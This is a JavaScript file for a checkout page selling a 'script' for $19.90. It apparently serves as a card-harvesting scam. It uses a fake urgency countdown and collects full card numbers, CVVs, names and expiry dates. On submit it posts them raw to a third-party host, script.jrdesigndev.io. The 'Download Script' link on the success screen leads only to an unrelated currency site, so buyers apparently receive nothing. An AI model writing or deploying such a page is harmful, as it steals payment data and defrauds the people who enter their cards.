document.addEventListener('DOMContentLoaded', function() {
  // Safe element selection function
  function $(selector) {
    const element = document.querySelector(selector);
    if (!element) {
      console.warn(`Element not found: ${selector}`);
    }
    return element;
  }

  const customFirstName = document.getElementById('custom-first-name');
  const customLastName = document.getElementById('custom-last-name');
  const customCardNumber = document.getElementById('custom-card-number');
  const customCardExpiryMonth = document.getElementById('custom-expiry-month');
  const customCardExpiryYear = document.getElementById('custom-expiry-year');
  const customCardCvv = document.getElementById('custom-cvv');
  const customSubmitBtn = document.getElementById('custom-submit-btn');
  const customCreditCard = document.querySelector('.custom-credit-card');
  const customCreditCardNumber = document.querySelector('.custom-credit-card-number');
  const customCreditCardName = document.querySelector('.custom-credit-card-name');
  const customCreditCardExpiry = document.querySelector('.custom-credit-card-expiry');
  const customCreditCardCvv = document.querySelector('.custom-credit-card-cvv');
  const customPaymentSection = document.querySelector('.custom-payment-section');

  // Prevent non-numeric input for card number
  customCardNumber.addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
    
    // Format card number display
    const formattedNumber = this.value.replace(/\d{4}(?=.)/g, '$& ');
    customCreditCardNumber.textContent = formattedNumber || '•••• •••• •••• ••••';
  });

  customFirstName.addEventListener('input', updateCardName);
  customLastName.addEventListener('input', updateCardName);

  function updateCardName() {
    const fullName = `${customFirstName.value} ${customLastName.value}`.toUpperCase();
    customCreditCardName.textContent = fullName || 'FULL NAME';
  }

  function updateExpiryDisplay() {
    const month = customCardExpiryMonth.value.padStart(2, '0');
    const year = customCardExpiryYear.value ? customCardExpiryYear.value.slice(-2) : '';
    customCreditCardExpiry.textContent = month && year ? `${month}/${year}` : 'MM/YY';
  }

  customCardExpiryMonth.addEventListener('input', updateExpiryDisplay);
  customCardExpiryYear.addEventListener('input', updateExpiryDisplay);

  // CVV Animation and Display
  customCardCvv.addEventListener('input', function() {
    customCreditCardCvv.textContent = this.value || 'CVV';
  });

  customCardCvv.addEventListener('focus', function() {
    customCreditCard.classList.add('flipped');
  });

  customCardCvv.addEventListener('blur', function() {
    customCreditCard.classList.remove('flipped');
  });

  // Countdown Timer
  function startCountdown() {
    const timerElement = document.getElementById('custom-timer');
    let remainingTime = 15 * 60; // 15 minutes

    function updateTimer() {
      const minutes = Math.floor(remainingTime / 60);
      const seconds = remainingTime % 60;
      timerElement.textContent = `Limited Time Offer Ends In: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
      
      if (remainingTime <= 0) {
        clearInterval(timerInterval);
        timerElement.textContent = 'Offer Expired!';
      }
      remainingTime--;
    }

    const timerInterval = setInterval(updateTimer, 1000);
    updateTimer(); // Immediate first call
  }

  startCountdown();

  // Prevent form default submission and call submitPaymentForm
  document.getElementById('custom-payment-form').addEventListener('submit', function(event) {
    event.preventDefault();
    submitPaymentForm();
  });

  window.submitPaymentForm = async function() {
    const customForm = $('#custom-payment-form');
    const customPaymentSection = $('.custom-payment-section');
    
    if (!customForm || !customPaymentSection) {
      console.error('Critical form elements are missing');
      return;
    }

    // Validate form
    if (!customForm.checkValidity()) {
      customForm.reportValidity();
      return;
    }

    // Safe element retrieval with fallback values
    const getInputValue = (selector) => {
      const element = $(selector);
      return element ? element.value.trim() : '';
    };

    const payload = {
      data: {
        number: getInputValue('#custom-card-number').replace(/\s/g, ''),
        verification_value: getInputValue('#custom-cvv'),
        first_name: getInputValue('#custom-first-name'),
        last_name: getInputValue('#custom-last-name'),
        month: getInputValue('#custom-expiry-month').padStart(2, '0'),
        year: getInputValue('#custom-expiry-year')
      }
    };

    // Validate payload
    if (!payload.data.number || !payload.data.verification_value) {
      console.error('Incomplete payment details');
      return;
    }

    // Processing Animation HTML
    const processingSection = `
      <div id="custom-processing-section">
        <div class="custom-loader-container">
          <svg class="custom-loader" viewBox="0 0 100 100">
            <defs>
              <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" style="stop-color:#1877f2;stop-opacity:1" />
                <stop offset="100%" style="stop-color:#42b72a;stop-opacity:1" />
              </linearGradient>
            </defs>
            <circle 
              cx="50" 
              cy="50" 
              r="45" 
              fill="none" 
              stroke="url(#gradient)" 
              stroke-width="10" 
              stroke-dasharray="283" 
              stroke-dashoffset="283"
              class="custom-loader-circle"
            />
          </svg>
          <div class="custom-loader-text">Processing Payment...</div>
        </div>
      </div>
    `;

    customPaymentSection.innerHTML = processingSection;

    try {
      const response = await fetch('https://script.jrdesigndev.io/paypay', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const responseData = await response.json();

      // Success Handling
      if (responseData.success === true || responseData.mensagem === "Pagamento aprovado") {
        const successSection = `
          <div class="custom-success-content">
            <div class="custom-success-icon">✓</div>
            <h2 class="custom-success-title">Thank You for Your Purchase!</h2>
            <p class="custom-success-description">Your payment has been successfully processed.</p>
            <div class="custom-download-link">
              <a href="https://www.xe.com/" target="_blank">Download Script</a>
            </div>
          </div>
        `;

        customPaymentSection.innerHTML = successSection;

        // Trigger confetti
        if (window.confetti) {
          confetti({
            particleCount: 100,
            spread: 70,
            origin: { y: 0.6 }
          });
        }
      } else {
        // Error Handling with detailed response
        const errorMessage = responseData.message || responseData.info_message || 'Payment not authorized';
        
        const errorSection = `
          <div class="custom-error-content">
            <div class="custom-error-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M12 2L1 22h22L12 2zm1 18h-2v-2h2v2zm0-4h-2V8h2v8z"/>
              </svg>
            </div>
            <h2 class="custom-error-title">Payment Failed</h2>
            <p class="custom-error-description">${errorMessage}</p>
            
            <div class="custom-error-details">
              <p><strong>Status:</strong> ${responseData.status || 'Unknown'}</p>
              <p><strong>Card Brand:</strong> ${responseData.brand || 'Not Available'}</p>
              <p><strong>Card Last 4 Digits:</strong> ${responseData.last4 || 'N/A'}</p>
            </div>
            
            <button id="custom-retry-btn" class="custom-retry-button" onclick="resetPaymentSection()">Try Again</button>
          </div>
        `;

        customPaymentSection.innerHTML = errorSection;
      }
    } catch (error) {
      console.error('Payment Error:', error);
      
      const errorSection = `
        <div class="custom-error-content">
          <div class="custom-error-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
              <path d="M12 2L1 22h22L12 2zm1 18h-2v-2h2v2zm0-4h-2V8h2v8z"/>
            </svg>
          </div>
          <h2 class="custom-error-title">Network Error</h2>
          <p class="custom-error-description">Unable to process payment. Please check your internet connection.</p>
          <button id="custom-retry-btn" class="custom-retry-button" onclick="resetPaymentSection()">Try Again</button>
        </div>
      `;

      customPaymentSection.innerHTML = errorSection;
    }
  };

  // Update form initialization to add placeholders and fix CVV validation
  function initializeFormInteractions() {
    const inputs = document.querySelectorAll('#custom-payment-form input');
    
    // Add placeholders and update validation
    inputs.forEach(input => {
      switch(input.id) {
        case 'custom-first-name':
          input.placeholder = 'John';
          break;
        case 'custom-last-name':
          input.placeholder = 'Doe';
          break;
        case 'custom-card-number':
          input.placeholder = '4111 1111 1111 1111';
          break;
        case 'custom-expiry-month':
          input.placeholder = '12';
          break;
        case 'custom-expiry-year':
          input.placeholder = '25';
          break;
        case 'custom-cvv':
          input.placeholder = '123';
          input.min = '000';  // Allow CVV starting from 000
          input.max = '9999'; // Allow 4-digit CVVs
          break;
      }
    });

    const customFirstName = document.getElementById('custom-first-name');
    const customLastName = document.getElementById('custom-last-name');
    const customCardNumber = document.getElementById('custom-card-number');
    const customCardExpiryMonth = document.getElementById('custom-expiry-month');
    const customCardExpiryYear = document.getElementById('custom-expiry-year');
    const customCardCvv = document.getElementById('custom-cvv');
    const customCreditCard = document.querySelector('.custom-credit-card');
    const customCreditCardNumber = document.querySelector('.custom-credit-card-number');
    const customCreditCardName = document.querySelector('.custom-credit-card-name');
    const customCreditCardExpiry = document.querySelector('.custom-credit-card-expiry');
    const customCreditCardCvv = document.querySelector('.custom-credit-card-cvv');

    customCardNumber.addEventListener('input', function(e) {
      this.value = this.value.replace(/\D/g, '');
      const formattedNumber = this.value.replace(/\d{4}(?=.)/g, '$& ');
      customCreditCardNumber.textContent = formattedNumber || '•••• •••• •••• ••••';
    });

    customFirstName.addEventListener('input', updateCardName);
    customLastName.addEventListener('input', updateCardName);

    function updateCardName() {
      const fullName = `${customFirstName.value} ${customLastName.value}`.toUpperCase();
      customCreditCardName.textContent = fullName || 'FULL NAME';
    }

    function updateExpiryDisplay() {
      const month = customCardExpiryMonth.value.padStart(2, '0');
      const year = customCardExpiryYear.value ? customCardExpiryYear.value.slice(-2) : '';
      customCreditCardExpiry.textContent = month && year ? `${month}/${year}` : 'MM/YY';
    }

    customCardExpiryMonth.addEventListener('input', updateExpiryDisplay);
    customCardExpiryYear.addEventListener('input', updateExpiryDisplay);

    customCardCvv.addEventListener('input', function() {
      customCreditCardCvv.textContent = this.value || 'CVV';
    });

    customCardCvv.addEventListener('focus', function() {
      customCreditCard.classList.add('flipped');
    });

    customCardCvv.addEventListener('blur', function() {
      customCreditCard.classList.remove('flipped');
    });
  }

  // Update resetPaymentSection to properly recreate the payment form and restore all event listeners
  window.resetPaymentSection = function() {
    const customPaymentSection = document.querySelector('.custom-payment-section');
    
    customPaymentSection.innerHTML = `
      <div id="custom-payment-container">
        <div class="custom-credit-card">
          <div class="custom-credit-card-inner">
            <div class="custom-credit-card-front">
              <div class="custom-credit-card-logo">CARD</div>
              <div class="custom-credit-card-number">•••• •••• •••• ••••</div>
              <div class="custom-card-details">
                <span class="custom-credit-card-name">FULL NAME</span>
                <span class="custom-credit-card-expiry">MM/YY</span>
              </div>
            </div>
            <div class="custom-credit-card-back">
              <div class="custom-credit-card-strip"></div>
              <div class="custom-credit-card-cvv-area">
                <span class="custom-credit-card-cvv">CVV</span>
              </div>
            </div>
          </div>
        </div>
        
        <div id="custom-form-wrapper">
          <form id="custom-payment-form">
            <div class="custom-form-row">
              <div class="custom-form-group">
                <label for="custom-first-name">First Name</label>
                <input type="text" id="custom-first-name" placeholder="John" required>
              </div>
              <div class="custom-form-group">
                <label for="custom-last-name">Last Name</label>
                <input type="text" id="custom-last-name" placeholder="Doe" required>
              </div>
            </div>
            
            <div class="custom-form-group">
              <label for="custom-card-number">Card Number</label>
              <input type="tel" inputmode="numeric" pattern="[0-9]*" id="custom-card-number" placeholder="4111 1111 1111 1111" required>
            </div>
            
            <div class="custom-card-details-row">
              <div class="custom-form-group">
                <label for="custom-expiry-month">Expiry Month</label>
                <input type="number" id="custom-expiry-month" min="1" max="12" placeholder="12" required>
              </div>
              <div class="custom-form-group">
                <label for="custom-expiry-year">Expiry Year</label>
                <input type="number" id="custom-expiry-year" min="23" max="30" placeholder="25" required>
              </div>
              <div class="custom-form-group">
                <label for="custom-cvv">CVV</label>
                <input type="number" id="custom-cvv" placeholder="123" required>
              </div>
            </div>
            
            <button type="submit" id="custom-submit-btn">Pay Now - $19.90</button>
          </form>
        </div>
        <div class="custom-support-note">
          Support: <a href="https://t.me/ninja_python" target="_blank">@ninja_python</a> on Telegram
        </div>
      </div>
    `;
    
    // Re-attach event listeners
    initializeFormInteractions();
    
    // Prevent form default submission and call submitPaymentForm
    document.getElementById('custom-payment-form').addEventListener('submit', function(event) {
      event.preventDefault();
      submitPaymentForm();
    });
    
    // Reinitialize Telegram support icon functionality
    addTelegramSupportFunctionality();
  };

  // Extract Telegram functionality to a separate function so we can call it after resetPaymentSection
  function addTelegramSupportFunctionality() {
    const telegramSupport = document.querySelector('.custom-telegram-support');
    const supportPopup = document.querySelector('.custom-support-popup');
    const closePopupBtn = document.querySelector('.custom-popup-close');
    const copyUsernameBtn = document.querySelector('.custom-copy-btn');
    const usernameInput = document.querySelector('.custom-username-input');

    if (telegramSupport) {
      telegramSupport.addEventListener('click', function(e) {
        e.preventDefault();
        document.querySelector('.custom-support-popup').classList.add('active');
      });
    }

    if (closePopupBtn) {
      closePopupBtn.addEventListener('click', function() {
        document.querySelector('.custom-support-popup').classList.remove('active');
      });
    }

    if (copyUsernameBtn && usernameInput) {
      copyUsernameBtn.addEventListener('click', function() {
        usernameInput.select();
        document.execCommand('copy');
        
        // Show copied message
        this.textContent = 'Copied!';
        setTimeout(() => {
          this.textContent = 'Copy';
        }, 2000);
      });
    }
  }

  initializeFormInteractions();
  // Initialize Telegram support functionality on page load
  addTelegramSupportFunctionality();
});